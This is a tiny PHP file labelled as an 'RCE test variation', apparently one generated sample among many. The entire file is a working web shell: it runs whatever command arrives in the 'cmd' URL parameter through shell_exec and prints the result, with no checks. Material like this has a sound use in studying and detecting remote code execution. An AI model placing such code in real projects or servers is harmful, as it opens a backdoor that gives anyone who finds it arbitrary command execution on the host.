<?php
// RCE test variation #1238
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>